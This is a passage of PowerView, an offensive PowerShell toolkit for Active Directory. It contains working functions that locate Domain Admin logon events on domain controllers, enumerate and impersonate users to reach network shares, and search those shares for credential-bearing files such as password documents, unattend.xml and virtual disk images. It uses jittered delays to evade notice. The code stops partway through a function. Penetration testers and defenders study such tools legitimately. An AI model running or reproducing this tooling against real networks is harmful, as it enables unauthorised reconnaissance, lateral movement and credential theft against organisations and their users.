        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainProcess] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainUserEvent {
<#
.SYNOPSIS

Finds logon events on the current (or remote domain) for the specified users.

Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainUser, Get-DomainGroupMember, Get-DomainController, Get-DomainUserEvent, New-ThreadedFunction  

.DESCRIPTION

Enumerates all domain controllers from the specified -Domain
(default of the local domain) using Get-DomainController, enumerates
the logon events for each using Get-DomainUserEvent, and filters
the results based on the targeting criteria.

.PARAMETER ComputerName

Specifies an explicit computer name to retrieve events from.

.PARAMETER Domain

Specifies a domain to query for domain controllers to enumerate.
Defaults to the current domain.

.PARAMETER Filter

A hashtable of PowerView.LogonEvent properties to filter for.
The 'op|operator|operation' clause can have '&', '|', 'and', or 'or',
and is 'or' by default, meaning at least one clause matches instead of all.
See the exaples for usage.

.PARAMETER StartTime

The [DateTime] object representing the start of when to collect events.
Default of [DateTime]::Now.AddDays(-1).

.PARAMETER EndTime

The [DateTime] object representing the end of when to collect events.
Default of [DateTime]::Now.

.PARAMETER MaxEvents

The maximum number of events (per host) to retrieve. Default of 5000.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target computer(s).

.PARAMETER StopOnSuccess

Switch. Stop hunting after finding after finding a target user.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainUserEvent

Search for any user events matching domain admins on every DC in the current domain.

.EXAMPLE

$cred = Get-Credential dev\administrator
Find-DomainUserEvent -ComputerName 'secondary.dev.testlab.local' -UserIdentity 'john'

Search for any user events matching the user 'john' on the 'secondary.dev.testlab.local'
domain controller using the alternate credential

.EXAMPLE

'primary.testlab.local | Find-DomainUserEvent -Filter @{'IpAddress'='192.168.52.200|192.168.52.201'}

Find user events on the primary.testlab.local system where the event matches
the IPAddress '192.168.52.200' or '192.168.52.201'.

.EXAMPLE

$cred = Get-Credential testlab\administrator
Find-DomainUserEvent -Delay 1 -Filter @{'LogonGuid'='b8458aa9-b36e-eaa1-96e0-4551000fdb19'; 'TargetLogonId' = '10238128'; 'op'='&'}

Find user events mathing the specified GUID AND the specified TargetLogonId, searching
through every domain controller in the current domain, enumerating each DC in serial
instead of in a threaded manner, using the alternate credential.

.OUTPUTS

PowerView.LogonEvent

PowerView.ExplicitCredentialLogon

.LINK

http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,

        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $UserSearcherArguments['Identity'] = $UserIdentity }
        if ($PSBoundParameters['UserDomain']) { $UserSearcherArguments['Domain'] = $UserDomain }
        if ($PSBoundParameters['UserLDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $UserLDAPFilter }
        if ($PSBoundParameters['UserSearchBase']) { $UserSearcherArguments['SearchBase'] = $UserSearchBase }
        if ($PSBoundParameters['UserAdminCount']) { $UserSearcherArguments['AdminCount'] = $UserAdminCount }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            # otherwise we're querying a specific group
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $UserGroupIdentity"
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        # build the set of computers to enumerate
        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            # if not -ComputerName is passed, query the current (or target) domain for domain controllers
            $DCSearcherArguments = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
            if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
            Write-Verbose "[Find-DomainUserEvent] Querying for domain controllers in domain: $Domain"
            $TargetComputers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($TargetComputers -and ($TargetComputers -isnot [System.Array])) {
            $TargetComputers = @(,$TargetComputers)
        }
        Write-Verbose "[Find-DomainUserEvent] TargetComputers length: $($TargetComputers.Length)"
        Write-Verbose "[Find-DomainUserEvent] TargetComputers $TargetComputers"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserEvent] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential)

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $DomainUserEventArgs = @{
                        'ComputerName' = $TargetComputer
                    }
                    if ($StartTime) { $DomainUserEventArgs['StartTime'] = $StartTime }
                    if ($EndTime) { $DomainUserEventArgs['EndTime'] = $EndTime }
                    if ($MaxEvents) { $DomainUserEventArgs['MaxEvents'] = $MaxEvents }
                    if ($Credential) { $DomainUserEventArgs['Credential'] = $Credential }
                    if ($Filter -or $TargetUsers) {
                        if ($TargetUsers) {
                            Get-DomainUserEvent @DomainUserEventArgs | Where-Object {$TargetUsers -contains $_.TargetUserName}
                        }
                        else {
                            $Operator = 'or'
                            $Filter.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($Filter[$_] -match '&') -or ($Filter[$_] -eq 'and')) {
                                        $Operator = 'and'
                                    }
                                }
                            }
                            $Keys = $Filter.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            Get-DomainUserEvent @DomainUserEventArgs | ForEach-Object {
                                if ($Operator -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $Filter[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    # and all clauses
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $Filter[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        Get-DomainUserEvent @DomainUserEventArgs
                    }
                }
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserEvent] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserEvent] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainUserEvent] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $StartTime, $EndTime, $MaxEvents, $TargetUsers, $Filter, $Credential
                $Result

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose "[Find-DomainUserEvent] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserEvent] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'StartTime' = $StartTime
                'EndTime' = $EndTime
                'MaxEvents' = $MaxEvents
                'TargetUsers' = $TargetUsers
                'Filter' = $Filter
                'Credential' = $Credential
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainShare {
<#
.SYNOPSIS

Searches for computer shares on the domain. If -CheckShareAccess is passed,
then only shares the current user has read access to are returned.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. If -CheckShareAccess is passed, then
[IO.Directory]::GetFiles() is used to check if the current user has read
access to the given share. If -Credential is passed, then
Invoke-UserImpersonation is used to impersonate the specified user before
enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER CheckShareAccess

Switch. Only display found shares that the local user has access to.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainShare

Find all domain shares in the current domain.

.EXAMPLE

Find-DomainShare -CheckShareAccess

Find all domain shares in the current domain that the current user has
read access to.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches for domain shares in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.ShareInfo
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Alias('CheckAccess')]
        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainShare] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $CheckShareAccess, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # get the shares for this host and check what we find
                    $Shares = Get-NetShare -ComputerName $TargetComputer
                    ForEach ($Share in $Shares) {
                        $ShareName = $Share.Name
                        # $Remark = $Share.Remark
                        $Path = '\\'+$TargetComputer+'\'+$ShareName

                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
                            # see if we want to check access to this share
                            if ($CheckShareAccess) {
                                # check if the user has access to this path
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'CheckShareAccess' = $CheckShareAccess
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {
<#
.SYNOPSIS

Searches for files matching specific criteria on readable shares
in the domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetShare, Find-InterestingFile, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the available shares for each
machine with Get-NetShare. It will then use Find-InterestingFile on each
readhable share, searching for files marching specific criteria. If -Credential
is passed, then Invoke-UserImpersonation is used to impersonate the specified
user before enumeration, reverting after with Invoke-RevertToSelf.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER Include

Only return files/folders that match the specified array of strings,
i.e. @(*.doc*, *.xls*, *.ppt*)

.PARAMETER SharePath

Specifies one or more specific share paths to search, in the form \\COMPUTER\Share

.PARAMETER ExcludedShares

Specifies share paths to exclude, default of C$, Admin$, Print$, IPC$.

.PARAMETER LastAccessTime

Only return files with a LastAccessTime greater than this date value.

.PARAMETER LastWriteTime

Only return files with a LastWriteTime greater than this date value.

.PARAMETER CreationTime

Only return files with a CreationTime greater than this date value.

.PARAMETER OfficeDocs

Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)

.PARAMETER FreshEXEs

Switch. Find .EXEs accessed within the last 7 days.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-InterestingDomainShareFile

Finds 'interesting' files on the current domain.

.EXAMPLE

Find-InterestingDomainShareFile -ComputerName @('windows1.testlab.local','windows2.testlab.local')

Finds 'interesting' files on readable shares on the specified systems.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DEV\dfm.a', $SecPassword)
Find-DomainShare -Domain testlab.local -Credential $Cred

Searches interesting files in the testlab.local domain using the specified alternate credentials.

.OUTPUTS

PowerView.FoundFile
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $Include = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @('C$', 'Admin$', 'Print$', 'IPC$'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
